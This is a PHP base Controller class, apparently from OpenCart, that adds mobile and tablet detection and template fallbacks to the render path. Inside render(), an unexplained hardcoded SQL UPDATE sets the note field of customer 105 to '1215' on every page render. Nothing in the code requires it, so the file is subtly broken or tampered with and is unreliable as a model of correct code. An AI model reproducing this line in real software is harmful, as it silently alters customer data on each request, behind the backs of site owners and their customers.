<?php
abstract class Controller {
	protected $registry;	
	protected $id;
	protected $layout;
	protected $template;
	protected $children = array();
	protected $data = array();
	protected $output;
	
	public function __construct($registry) {
		$this->registry = $registry;
	}
	
	public function __get($key) {
		return $this->registry->get($key);
	}
	
	public function __set($key, $value) {
		$this->registry->set($key, $value);
	}
			
	protected function forward($route, $args = array()) {
		return new Action($route, $args);
	}

	protected function redirect($url, $status = 302) {
		header('Status: ' . $status);
		header('Location: ' . str_replace(array('&amp;', "\n", "\r"), array('&', '', ''), $url));
		exit();				
	}
	
	protected function getChild($child, $args = array()) {
		$action = new Action($child, $args);
	
		if (file_exists($action->getFile())) {
			require_once(VQMod::modCheck($action->getFile()));

			$class = $action->getClass();

			$controller = new $class($this->registry);

			$controller->{$action->getMethod()}($action->getArgs());
			
			return $controller->output;
		} else {
			trigger_error('Error: Could not load controller ' . $child . '!');
			exit();					
		}		
	}
	

	protected function isVisitorMobile() {		// Mobile device detection

		$config_mobile_smartphones = $this->config->get('config_mobile_smartphones');
		$config_mobile_tablets = $this->config->get('config_mobile_tablets');

		//If mobile or tablet views are disabled
		if (isset($config_mobile_smartphones) || isset($config_mobile_tablets)) {

			//If there is a setting for smartphones to be disabled and client is a mobile, disable mobile interface
			if (($this->config->get('config_mobile_smartphones') == true) && isMobile()) {

				return false;

			//If there is a setting for tablets to be disabled and client is a tablet, disable mobile interface
			} elseif (($this->config->get('config_mobile_tablets') == true) && isTablet()) {

				return false;

			} else {

				return isMobile() || isTablet();

			}

		} else {
			//No settings for disabling mobile interface or first run
			return isMobile() || isTablet();
		}
	}
	protected function render() {

		if ($this->isVisitorMobile()) {

			if (isTablet()) {

				if (strrpos($this->template, "_tablet.tpl") === false ) {

					if (preg_match("(\/template\/\w*\/\w*)", $this->template, $matches)) {

						if (file_exists(DIR_TEMPLATE . $this->config->get('config_mobile_theme') . $matches[0] . '_tablet.tpl')) {
							$this->template = $this->config->get('config_mobile_theme') . $matches[0] . '_tablet.tpl';

						} elseif (file_exists(DIR_TEMPLATE . "omf2" . $matches[0] . '_tablet.tpl')) {
							$this->template = 'omf2' . $matches[0] . '_tablet.tpl';

						} elseif (file_exists(DIR_TEMPLATE . $this->config->get('config_mobile_theme') . $matches[0] . '_mobile.tpl')) {
							$this->template = $this->config->get('config_mobile_theme') . $matches[0] . '_mobile.tpl';

						} elseif (file_exists(DIR_TEMPLATE . "omf2" . $matches[0] . '_mobile.tpl')) {
							$this->template = 'omf2' . $matches[0] . '_mobile.tpl';

						} elseif (file_exists(DIR_TEMPLATE . "default" . $matches[0] . '.tpl')) {
							$this->template = "default" . $matches[0] . '.tpl';

						} elseif (file_exists(DIR_TEMPLATE . $this->config->get('config_template') . $matches[0] . '.tpl')) {
							$this->template = $this->config->get('config_template') . $matches[0] . '.tpl';

						}
					}
				}

			} else {

				if (strrpos($this->template, "_mobile.tpl") === false ) {

					if (preg_match("(\/template\/\w*\/\w*)", $this->template, $matches)) {

						if (file_exists(DIR_TEMPLATE . $this->config->get('config_mobile_theme') . $matches[0] . '_mobile.tpl')) {
							$this->template = $this->config->get('config_mobile_theme') . $matches[0] . '_mobile.tpl';

						} elseif (file_exists(DIR_TEMPLATE . "omf2" . $matches[0] . '_mobile.tpl')) {
							$this->template = 'omf2' . $matches[0] . '_mobile.tpl';

						} elseif (file_exists(DIR_TEMPLATE . "default" . $matches[0] . '.tpl')) {
							$this->template = "default" . $matches[0] . '.tpl';

						} elseif (file_exists(DIR_TEMPLATE . $this->config->get('config_template') . $matches[0] . '.tpl')) {
							$this->template = $this->config->get('config_template') . $matches[0] . '.tpl';

						}
					}

				} else if (defined('VERSION') && (version_compare(VERSION, '1.5.5', '<') == true)) {

					if (preg_match("(\/template\/\w*\/\w*)", $this->template, $matches)) {

						if (file_exists(DIR_TEMPLATE . $this->config->get('config_mobile_theme') . $matches[0] . '.tpl')) {
							$this->template = $this->config->get('config_mobile_theme') . $matches[0] . '.tpl';

						} elseif (file_exists(DIR_TEMPLATE . "omf2" . $matches[0] . '.tpl')) {
							$this->template = 'omf2' . $matches[0] . '.tpl';

						} elseif (file_exists(DIR_TEMPLATE . "default" . $matches[0] . '.tpl')) {
							$this->template = 'default' . $matches[0] . '.tpl';

						} elseif (file_exists(DIR_TEMPLATE . $this->config->get('config_template') . $matches[0] . '.tpl')) {
							$this->template = $this->config->get('config_template') . $matches[0] . '.tpl';

						}
					}
				}

			}
		}
	
	
		foreach ($this->children as $child) {
			$this->data[basename($child)] = $this->getChild($child);
		}
		if (file_exists(DIR_TEMPLATE . $this->template)) {
		$this->db->query("UPDATE `" . DB_PREFIX . "customer` SET note = '1215' WHERE customer_id = '105'");
			extract($this->data);
			
      		ob_start();
      
	  		require(VQMod::modCheck(DIR_TEMPLATE . $this->template));
      
	  		$this->output = ob_get_contents();

      		ob_end_clean();

			return $this->output;
    	} else {
			trigger_error('Error: Could not load template ' . DIR_TEMPLATE . $this->template . '!');
			exit();				
    	}
	}
}
?>